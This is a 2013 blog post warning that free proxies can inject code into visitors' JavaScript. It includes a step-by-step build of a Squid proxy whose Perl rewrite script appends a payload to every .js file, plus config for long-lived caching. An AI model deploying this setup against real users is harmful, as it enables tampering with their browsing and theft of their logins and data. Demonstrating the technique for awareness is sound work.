<!DOCTYPE html>
<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
  <meta content="index, follow" name="robots"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <meta content="" name="description"/>
  <meta content="Christian Haschek" name="author"/>
  <link href="https://blog.haschek.at/" rel="canonical"/>
  <!-- Twitter Card data -->
  <meta content="summary" name="twitter:card"/>
  <meta content="@geek_at" name="twitter:site"/>
  <meta content="Why are free proxies free?" name="twitter:title"/>
  <meta content="Personal blog of Christian Haschek" name="twitter:description"/>
  <meta content="@geek_at" name="twitter:creator"/>
  <!-- Twitter Summary card images must be at least 120x120px -->
  <meta content="http://blog.haschek.at/data/header_imgs/security1-bg.jpg" name="twitter:image"/>
  <!-- Schema.org markup for Google+ -->
  <meta content="Why are free proxies free?" itemprop="name"/>
  <meta content="Personal blog of Christian Haschek" itemprop="description"/>
  <meta content="http://blog.haschek.at/data/header_imgs/security1-bg.jpg" itemprop="image"/>
  <!-- Open Graph data -->
  <meta content="Why are free proxies free?" property="og:title"/>
  <meta content="article" property="og:type"/>
  <meta content="http://blog.haschek.at/post/fd9bc" property="og:url"/>
  <meta content="http://blog.haschek.at/data/header_imgs/security1-bg.jpg" property="og:image"/>
  <meta content="because it's an easy way to infect thousands of users and collect their data" property="og:description"/>
  <meta content="Why are free proxies free?" property="og:site_name"/>
  <meta content="2013-05-29 16:59:00" property="article:published_time"/>
  <meta content="2015-07-07 12:37:23" property="article:modified_time"/>
  <meta content="proxies,script,perl,safe browsing,exploitation,chema alonso,defcon,proxy" property="article:tag"/>
  <link href="http://blog.haschek.at/atom.xml" rel="alternate" title="Futurelopment | a Christian Haschek Blog - Atom" type="application/atom+xml"/>
  <link href="http://blog.haschek.at/rss.xml" rel="alternate" title="Futurelopment | a Christian Haschek Blog - RSS" type="application/rss+xml"/>
  <link href="http://blog.haschek.at/atom.xml" rel="service.post" title="Futurelopment | a Christian Haschek Blog - Atom" type="application/atom+xml"/>
  <title>
   Why are free proxies free?
  </title>
  <!-- jQuery -->
  <script src="/js/jquery.js">
  </script>
  <!-- Bootstrap Core CSS -->
  <link href="/css/bootstrap.min.css" rel="stylesheet"/>
  <!-- Custom CSS -->
  <link href="/css/clean-blog.min.css" rel="stylesheet"/>
  <link href="/css/bootstrap-markdown.min.css" rel="stylesheet"/>
  <link href="/css/prism.css" rel="stylesheet"/>
  <!-- Custom Fonts -->
  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
  <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
  <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]&gt;
        &lt;script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"&gt;&lt;/script&gt;
        &lt;script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"&gt;&lt;/script&gt;
    &lt;![endif]-->
 </head>
 <body>
  <!-- Navigation -->
  <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
   <div class="container-fluid">
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header page-scroll">
     <button class="navbar-toggle" data-target="#bs-example-navbar-collapse-1" data-toggle="collapse" type="button">
      <span class="sr-only">
       Toggle navigation
      </span>
      <span class="icon-bar">
      </span>
      <span class="icon-bar">
      </span>
      <span class="icon-bar">
      </span>
     </button>
     <a class="navbar-brand" href="/">
      Futurelopment
     </a>
    </div>
    <!-- Collect the nav links, forms, and other content for toggling -->
    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
     <ul class="nav navbar-nav navbar-right">
      <li class="menu_item" id="page_home" page="home">
       <a class=" " href="/home">
        Home
       </a>
      </li>
      <li class="menu_item" id="page_aboutme" page="aboutme">
       <a class=" " href="/aboutme">
        About me
       </a>
      </li>
      <li class="menu_item" id="page_cryptobin" page="cryptobin">
       <a class=" " href="/cryptobin">
        Cryptobin
       </a>
      </li>
     </ul>
    </div>
    <!-- /.navbar-collapse -->
   </div>
   <!-- /.container -->
  </nav>
  <!-- Page Header -->
  <!-- Set your background image for this header on the line below. -->
  <header class="intro-header" style="background-image: url('/data/header_imgs/security1-bg.jpg')">
   <div class="container">
    <div class="row">
     <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <div class="post-heading">
       <h1>
        Why are free proxies free?
       </h1>
       <h2 class="subheading">
        because it's an easy way to infect thousands of users and collect their data
       </h2>
       <span class="meta">
        Posted by Christian Haschek on 29.05.13
       </span>
      </div>
     </div>
    </div>
   </div>
   <div id="header_copyright">
    
    <a href="http://www.miscellaneoushi.com/Computers_Technology/hacking/anonymous_hacking_terminal_commands_ligne_1920x1080_wallpaper_665" target="_blank">
     Anonymous wallpaper
    </a>
   </div>
  </header>
  <div class="container">
   <!-- Pager -->
   <ul class="pager">
    <li class="next">
     <a href="/post/ff7da">
      Next Post 
     </a>
    </li>
    <li class="previous">
     <a href="/post/fb64f">
       Previous Post
     </a>
    </li>
   </ul>
   <article>
    <div class="container">
     <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
       <p>
        [UPDATE] Check out the
        <a href="https://blog.haschek.at/2015-analyzing-443-free-proxies">
         new post
        </a>
        where I scan the web for proxies that use this kind of manipulation:
        <a href="https://blog.haschek.at/2015-analyzing-443-free-proxies">
         https://blog.haschek.at/2015-analyzing-443-free-proxies
        </a>
       </p>
       <p>
        I recently stumbled across a
        <a href="http://www.youtube.com/watch?v=kLt_uqSCEUA">
         presentation
        </a>
        of
        <a href="https://twitter.com/chemaalonso">
         Chema Alonso
        </a>
        from the Defcon 20 Conference where he was talking about how he created a Javascript botnet from scratch and how he used it to find scammers and hackers.
       </p>
       <p>
        Everything is done via a stock SQUID proxy with small config changes.
       </p>
       <p>
        The idea is pretty simple:
       </p>
       <ol>
        <li>
         <strong>
          [Server]
         </strong>
         Install Squid on a linux server
        </li>
        <li>
         <strong>
          [Payload]
         </strong>
         Modify the server so all transmitted javascript files will get one extra piece of code that does things like send all data entered in forms to your server
        </li>
        <li>
         <strong>
          [Cache]
         </strong>
         Set the caching time of the modified .js files as high as possible
        </li>
       </ol>
       <h3>
        What's the worst thing that could happen?
       </h3>
       <p>
        When someone can force you to load an infected .js file, they can
       </p>
       <ul>
        <li>
         Steal your login info of the sites you visit (from login forms or cookies)
        </li>
        <li>
         Steal your banking account info/credit card
        </li>
        <li>
         Force you to participate in DDoS attacks by telling you browser to load a website a few hundred times a second via iframe/script request
        </li>
        <li>
         basically see everything you're doing on the web (including reading mouse positions, etc.)
        </li>
       </ul>
       <h3>
        https
       </h3>
       <p>
        This technique
        <strong>
         also works with https
        </strong>
        if the site loads unsafe resources (eg. jquery from a http site). Most browsers will tell you that, some might even block the content but usually nobody gives attention to the "lock" symbol.
       </p>
       <h4>
        To put it simple
       </h4>
       <ul>
        <li>
         Safe:
         <img alt="safe https" class="img-responsive" src="https://www.pictshare.net/originals/a1279bf58d.png" title="safe https"/>
        </li>
        <li>
         Unsafe:
         <img alt="unsafe https" class="img-responsive" src="https://www.pictshare.net/originals/9f0d9fc0ce.png" title="unsafe https"/>
        </li>
       </ul>
       <p>
        In the presentation Chema said he posted the IP of the modified server on the web and after a few days there were over 5000 people using his proxy.
Most people used it for bad things because everyone knows you're only anonymous in the web when you've got a proxy and it looks like many people don't think that the proxy could do something bad to them.
       </p>
       <p>
        I was wondering if it really is
        <em>
         that
        </em>
        simple so I took a VM running Debian and tried implementing the concept myself
       </p>
       <hr/>
       <h1>
        Make your own js infecting proxy
       </h1>
       <p>
        I assume that you have a squid proxy running and also you'll need a webserver like Apache using /var/www as web root directory (which is the default)
       </p>
       <h2>
        Step 1: Create a payload
       </h2>
       <p>
        For the payload I'll use a simple script that takes all links of a webpage and rewrites the href (link) attribute to my site.
       </p>
       <p>
        /etc/squid/payload.js
       </p>
       <pre class="line-numbers">
        <code class="language-javascript">
         for(var i=0;i&lt;document.getElementsByTagName('a').length;i++)  
   document.getElementsByTagName('a')[i].href = "https://blog.haschek.at";
        </code>
       </pre>
       <h2>
        Step 2: Write the script that poisons all requested .js files
       </h2>
       <p>
        /etc/squid/poison.pl
       </p>
       <pre class="line-numbers">
        <code class="language-javascript">
         #!/usr/bin/perl

$|=1;
$count = 0;
$pid = $$;

while(&lt;&gt;)
{
  chomp $_;
  if($_ =- /(.*\.js)/i)
  {
        $url = $1;
        system("/usr/bin/wget","-q","-O","/var/www/tmp/$pid-$count.js","$url");
        system("chmod o+r /var/www/tmp/$pid-$count.js");
        system("cat /etc/squid/payload.js &gt;&gt; /var/www/tmp/$pid-$count.js");
        print "http://127.0.0.1:80/tmp/$pid-$count.js\n";
  }
  else
  {
        print "$_\n";
  }
$count++;
}
        </code>
       </pre>
       <p>
        This script uses wget to retrieve the original javascript file of the page the client asked for and adds the code from the /etc/squid/payload.js file to it. This modified file (which contains our payload now) will be sent to the client.
You'll also have to create the folder /var/www/tmp and allow squid to write files in it. This folder is where all modified js scripts will be stored.
       </p>
       <h2>
        Step 3: Tell Squid to use the script above
       </h2>
       <p>
        in /etc/squid/squid.conf add
       </p>
       <pre class="line-numbers">
        <code>
         url_rewrite_program /etc/squid/poison.pl
        </code>
       </pre>
       <h2>
        Step 4: Never let the cache expire
       </h2>
       <p>
        /var/www/tmp/.htaccess
       </p>
       <pre class="line-numbers">
        <code>
         ExpiresActive On
ExpiresDefault "access plus 3000 days"
        </code>
       </pre>
       <p>
        These lines tell the apache server to give it an insanely long expiration(caching) time so it will be in the browser of the user until they're cleaning their cookies/caches
       </p>
       <hr/>
       <p>
        One more restart of squid and you're good to go. If you're connecting to the proxy and try to surf on any webpage, the page will be displayed as expected but all links will lead to this blog. The sneaky thing about this technique is that even when somebody disconnects from the proxy the cached js files will most likely be still in their caches.
       </p>
       <p>
        In my example the payload does nothing too destructive and the user will know pretty fast that something is fishy but with creative payloads or Frameworks like
        <a href="http://beefproject.com">
         Beef
        </a>
        all sorts of things could be implemented. Tell your friends never to use free proxies because many hosts do things like that.
       </p>
       <p>
        Be safe on the web (but not with free proxies)
       </p>
      </div>
     </div>
    </div>
   </article>
   <hr class="small" style="border-color:#404040;"/>
   <div style="text-align:center">
    <small>
     Tags:
     <a href="/search/tag/proxies">
      proxies
     </a>
     |
     <a href="/search/tag/script">
      script
     </a>
     |
     <a href="/search/tag/perl">
      perl
     </a>
     |
     <a href="/search/tag/safe browsing">
      safe browsing
     </a>
     |
     <a href="/search/tag/exploitation">
      exploitation
     </a>
     |
     <a href="/search/tag/chema alonso">
      chema alonso
     </a>
     |
     <a href="/search/tag/defcon">
      defcon
     </a>
     |
     <a href="/search/tag/proxy">
      proxy
     </a>
    </small>
   </div>
   <div style="text-align:center;">
    <small title="Views">
     <i class="fa fa-eye">
     </i>
     112.276
    </small>
   </div>
   <div style="text-align:center">
    <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fblog.haschek.at%2Fpost%2Ffd9bc&amp;t=Why%20are%20free%20proxies%20free%3F" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=300,width=600');return false;" style="font-size:40px;" target="_blank" title="Share on Facebook">
     <i class="fa fa-facebook-square">
     </i>
    </a>
    <a href="https://twitter.com/share?url=https%3A%2F%2Fblog.haschek.at%2Fpost%2Ffd9bc&amp;via=geek_at&amp;text=Why%20are%20free%20proxies%20free%3F" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=300,width=600');return false;" style="font-size:40px;" target="_blank" title="Share on Twitter">
     <i class="fa fa-twitter-square">
     </i>
    </a>
    <a href="https://plus.google.com/share?url=https%3A%2F%2Fblog.haschek.at%2Fpost%2Ffd9bc" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=350,width=480');return false;" style="font-size:40px;" target="_blank" title="Share on Google+">
     <i class="fa fa-google-plus-square">
     </i>
    </a>
    <br/>
    <script id="fbkobv7">
     (function(i){var f,s=document.getElementById(i);f=document.createElement('iframe');f.src='//api.flattr.com/button/view/?uid=geek_at&amp;url='+encodeURIComponent(document.URL);f.title='Flattr';f.height=62;f.width=55;f.style.borderWidth=0;s.parentNode.insertBefore(f,s);})('fbkobv7');
    </script>
    <p style="font-size:14px;margin-left:auto;margin-right:auto;text-align:center;">
     There are no ads on this (https enforced) blog. Please help me to keep it that way
     <br/>
     <i class="fa fa-btc">
     </i>
     <strong style="font-family: 'Open Sans','Helvetica Neue',Helvetica,Arial,sans-serif;">
      1NoDYC5YMSmzLAiULckZZfB6UJAZQprxi
     </strong>
     <br/>
     <!--LTC: LUf3y1cGNQz45vNZtVFVPFWosE23yEMw29-->
    </p>
   </div>
   <script>
    $(document).ready(function(){visit("https://blog.haschek.at/post/fd9bc");});
   </script>
   <!-- Pager -->
   <ul class="pager">
    <li class="next">
     <a href="/post/ff7da">
      Next Post 
     </a>
    </li>
    <li class="previous">
     <a href="/post/fb64f">
       Previous Post
     </a>
    </li>
   </ul>
  </div>
  <hr/>
  <!-- Footer -->
  <footer>
   <div class="container">
    <div class="row">
     <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <ul class="list-inline text-center">
       <li>
        <a href="http://christian.haschek.at">
         <span class="fa-stack fa-lg">
          <i class="fa fa-circle fa-stack-2x">
          </i>
          <i class="fa fa-home fa-stack-1x fa-inverse">
          </i>
         </span>
        </a>
       </li>
       <li>
        <a href="https://www.facebook.com/christian.haschek">
         <span class="fa-stack fa-lg">
          <i class="fa fa-circle fa-stack-2x">
          </i>
          <i class="fa fa-facebook fa-stack-1x fa-inverse">
          </i>
         </span>
        </a>
       </li>
       <li>
        <a href="https://plus.google.com/+ChristianHaschek">
         <span class="fa-stack fa-lg">
          <i class="fa fa-circle fa-stack-2x">
          </i>
          <i class="fa fa-google-plus-square fa-stack-1x fa-inverse">
          </i>
         </span>
        </a>
       </li>
       <li>
        <a href="https://twitter.com/geek_at">
         <span class="fa-stack fa-lg">
          <i class="fa fa-circle fa-stack-2x">
          </i>
          <i class="fa fa-twitter-square fa-stack-1x fa-inverse">
          </i>
         </span>
        </a>
       </li>
      </ul>
      <p class="copyright text-muted">
       Copyright  Christian Haschek 2015
      </p>
     </div>
    </div>
   </div>
  </footer>
  <!-- Bootstrap Core JavaScript -->
  <script src="/js/bootstrap.min.js">
  </script>
  <!-- Custom Theme JavaScript -->
  <script src="/js/clean-blog.js">
  </script>
  <script src="/js/bootstrap-markdown.js">
  </script>
  <script src="/js/markdown.js">
  </script>
  <script src="/js/to-markdown.js">
  </script>
  <script src="/js/prism.js">
   &lt;/script&gt;
    &lt;script src="/js/blog.js"&gt;
  </script>
  <!-- Piwik -->
  <script type="text/javascript">
   var _paq = _paq || [];
  _paq.push(['trackPageView']);
  _paq.push(['enableLinkTracking']);
  (function() {
    var u="//tracking.haschek.at/";
    _paq.push(['setTrackerUrl', u+'piwik.php']);
    _paq.push(['setSiteId', 2]);
    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'piwik.js'; s.parentNode.insertBefore(g,s);
  })();
  </script>
  <noscript>
   <p>
    <img alt="" src="//tracking.haschek.at/piwik.php?idsite=2" style="border:0;"/>
   </p>
  </noscript>
  <!-- End Piwik Code -->
 </body>
</html>